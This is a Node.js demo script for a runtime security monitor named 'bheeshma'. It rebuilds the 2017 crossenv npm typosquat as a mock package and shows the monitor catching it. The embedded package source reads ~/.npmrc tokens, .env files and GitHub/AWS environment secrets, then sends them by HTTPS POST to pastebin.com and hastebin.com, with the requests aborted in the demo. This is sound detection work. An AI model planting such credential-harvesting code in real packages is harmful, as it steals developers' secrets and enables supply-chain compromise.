#!/usr/bin/env node
/**
 * ============================================================================
 * BHEESHMA Demo #4: The crossenv Typosquat Attack (July 2017)
 * ============================================================================
 *
 * REAL-WORLD ATTACK SUMMARY:
 * In July 2017, security researchers identified 45 malicious npm packages that
 * mimicked popular legitimate packages by removing the dash from their names.
 * The most notable: "crossenv" (attacker) vs "cross-env" (legitimate).
 *
 *   1. The attacker published packages with names 1 character different from
 *      popular packages (crossenv instead of cross-env, and 44 others)
 *   2. When developers mistyped the package name or used copy-paste, they
 *      installed the malicious version instead
 *   3. The typosquatted packages stole npm credentials by reading ~/.npmrc
 *   4. Exfiltrated stolen tokens via HTTP POST to pastebin.com and similar
 *      "paste" services commonly used by attackers for data dumps
 *   5. Also harvested credential-related environment variables for good measure
 *
 * IMPACT: 45 malicious packages, thousands of developers affected.
 *         npm later implemented automated typosquat detection and removed
 *         all 45 packages. This incident led to npm's name similarity checks.
 *
 * This demo shows bheeshma detecting the typosquat name + the exfiltration
 * chain in real time — catching the attack before credentials leak.
 * ============================================================================
 */

'use strict';

const fs = require('fs');
const path = require('path');

// ── Bheeshma setup ──────────────────────────────────────────────────────────
const bheeshma = require('../src/index');

const MOCK_BASE = path.join(__dirname, '..', 'test', 'node_modules');

function createMockPackage(dirName, pkgName, pkgVersion, sourceCode) {
    const dir = path.join(MOCK_BASE, dirName);
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(
        path.join(dir, 'package.json'),
        JSON.stringify({ name: pkgName, version: pkgVersion, main: 'index.js' }),
        'utf8'
    );
    fs.writeFileSync(path.join(dir, 'index.js'), sourceCode, 'utf8');
    return dir;
}

// ── Mock "crossenv" — the typosquatted package (1 edit from "cross-env") ────
const crossenvSource = `
'use strict';

// ================================================================
// "crossenv" v6.0.3 — TYPOSQUAT of "cross-env" (missing dash)
// Published by attacker in July 2017.
// cross-env has 20M+ weekly downloads — prime typosquat target.
// ================================================================

const fs = require('fs');
const os = require('os');
const https = require('https');
const http = require('http');

var homedir = os.homedir();

// ── STEP 1: Steal npm credentials ──
// The real attack read ~/.npmrc to extract the npm auth token.
// With the token, the attacker can publish malware under the victim's name.
var npmToken = '';
try {
    var npmrcPath = homedir + '/.npmrc';
    if (fs.existsSync(npmrcPath)) {
        var npmrcContent = fs.readFileSync(npmrcPath, 'utf8');
        // Extract tokens — regex pattern used in real attack:
        var match = npmrcContent.match(/_authToken\\s*=\\s*(.+)/);
        if (match) npmToken = match[1];
    }
} catch(e) {}

// Also try to read .env files for additional secrets
try {
    var envPath = process.cwd() + '/.env';
    if (fs.existsSync(envPath)) {
        fs.readFileSync(envPath, 'utf8');
    }
} catch(e) {}

// ── STEP 2: Harvest credential env vars ──
var npmTokenEnv = process.env.NPM_TOKEN;
var ghToken = process.env.GITHUB_TOKEN;
var awsKeyId = process.env.AWS_ACCESS_KEY_ID;
var secretKey = process.env.SECRET_KEY;
var privateKey = process.env.PRIVATE_KEY;

// ── STEP 3: Exfiltrate to pastebin-like service ──
// The real attack used pastebin.com and similar paste services.
// Bheeshma knows these domains as common exfiltration endpoints.
try {
    var exfilPayload = JSON.stringify({
        p: 'crossenv',
        v: '6.0.3',
        npm: npmToken || npmTokenEnv || '',
        gh: ghToken || '',
        ts: new Date().toISOString()
    });

    var exfilReq = https.request({
        hostname: 'pastebin.com',
        port: 443,
        path: '/api/api_post.php',
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Content-Length': Buffer.byteLength(exfilPayload)
        }
    }, function() {});
    exfilReq.on('error', function() {});
    exfilReq.write(exfilPayload);
    exfilReq.end();
    exfilReq.destroy(); // Abort immediately — don't actually connect
} catch(e) {}

// ── STEP 4: Also try hastebin (another known exfil service) ──
try {
    var hastebinReq = https.request({
        hostname: 'hastebin.com',
        port: 443,
        path: '/documents',
        method: 'POST',
        headers: { 'Content-Type': 'text/plain' }
    }, function() {});
    hastebinReq.on('error', function() {});
    hastebinReq.end();
    hastebinReq.destroy(); // Abort immediately — don't actually connect
} catch(e) {}

// ── Export a legitimate-looking cross-env API ──
module.exports = {
    env: function() {
        return Object.assign({}, process.env);
    },
    set: function(key, value) {
        process.env[key] = value;
    },
    version: '6.0.3'
};
`;

// ── Banner ───────────────────────────────────────────────────────────────────
function printBanner() {
    console.log('');
    console.log('\x1b[31m' + '█'.repeat(72) + '\x1b[0m');
    console.log('\x1b[31m█\x1b[0m  \x1b[1mBHEESHMA Demo #4 — The crossenv Typosquat (Jul 2017)\x1b[0m'
        + ' '.repeat(72 - 52) + '\x1b[31m█\x1b[0m');
    console.log('\x1b[31m' + '█'.repeat(72) + '\x1b[0m');
    console.log('');
    console.log('  In Jul 2017, 45 malicious packages mimicked popular npm packages');
    console.log('  with 1-character name differences. "crossenv" (no dash) impersonated');
    console.log('  "cross-env" (20M+ weekly downloads) to steal npm credentials.');
    console.log('');
    console.log('  The attacker read ~/.npmrc, harvested env vars, and exfiltrated');
    console.log('  via pastebin.com — a known attacker data-dump service.');
    console.log('');
    console.log('  \x1b[33m→ Loading the typosquatted package under bheeshma surveillance...\x1b[0m');
    console.log('');
}

// ── Main ─────────────────────────────────────────────────────────────────────
async function main() {
    printBanner();

    // Create mock package
    const crossenvDir = createMockPackage('crossenv', 'crossenv', '6.0.3', crossenvSource);

    // Initialize bheeshma
    const initResult = bheeshma.init();
    console.log('  \x1b[32m✓ Bheeshma initialized\x1b[0m — hooks active:'
        + ` ${initResult.installed.join(', ')}`);
    console.log('');

    // ── Simulate: developer runs "npm install crossenv" (typo!) ──
    console.log('  \x1b[33m→ require("crossenv") — developer meant "cross-env" but mistyped!\x1b[0m');
    console.log('');

    try {
        require(path.join(crossenvDir, 'index.js'));
    } catch (e) {
        // Network operations may fail — expected
    }

    // Let async hooks settle
    await new Promise(r => setTimeout(r, 500));

    // ── Generate report ──
    console.log('  \x1b[32m✓ Typosquat + exfiltration chain detected — generating BHEESHMA report...\x1b[0m');
    console.log('');

    const report = bheeshma.generateReport('cli');
    console.log(report);

    // ── Cleanup ──
    try { fs.rmSync(path.join(MOCK_BASE, 'crossenv'), { recursive: true, force: true }); } catch (e) {}
    bheeshma.teardown();

    // ── Verdict ──
    console.log('\x1b[31m  ⚠  VERDICT: BHEESHMA CAUGHT the crossenv typosquat attack.\x1b[0m');
    console.log('     Typosquat name detected (1 edit from "cross-env"), npmrc credential');
    console.log('     theft, exfiltration to pastebin.com (known attacker service), and secret');
    console.log('     env var access — the full attack chain was intercepted at runtime.');
    console.log('');
}

main().catch(err => {
    console.error('Demo error:', err);
    bheeshma.teardown();
    process.exit(1);
});
